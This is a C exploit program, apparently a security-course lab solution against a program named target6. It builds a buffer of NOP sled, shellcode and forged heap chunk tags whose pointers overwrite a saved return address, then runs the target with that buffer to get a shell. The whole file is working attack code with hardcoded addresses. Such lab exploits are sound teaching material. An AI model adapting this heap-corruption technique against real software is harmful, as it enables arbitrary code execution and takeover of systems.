#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

//&rip = 0x3021fea8
//&p = 0x0104ec48
//&q = 0x0104ec98
#define TARGET "../targets/target6"
#define BUFSIZE 81 // (0x98-0x48)=80+1('\0')
#define SHELLSIZE 45 // strlen(shellcode)=45

int main(void)
{
  char *args[3];
  char *env[1];

  //making overflow buffer
	char buff[BUFSIZE];

  //fill in the buff with NOP
	for(int i=0;i<BUFSIZE;i++)
	{
		buff[i] = '\x90'; //NOP 0x90
	}

  //fake tag right at p
  memcpy(&buff[0],"\xeb\x06", 2); //left: \xeb\x06\x90\x90
  memcpy(&buff[4],"\x91", 1); //right: \x91\x90\x90\x90

  //put shellcode 
	for(int i=0;i<SHELLSIZE;i++)
	{
		buff[8+i] = shellcode[i];
	}

  //fake tag right before q
  memcpy(&buff[72],"\x48\xec\x04\x01", 4); //left -> p
  memcpy(&buff[76],"\xa8\xfe\x21\x30", 4); //right -> rip

  //put null terminator at the end of buffer
	buff[BUFSIZE-1] = '\0';

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}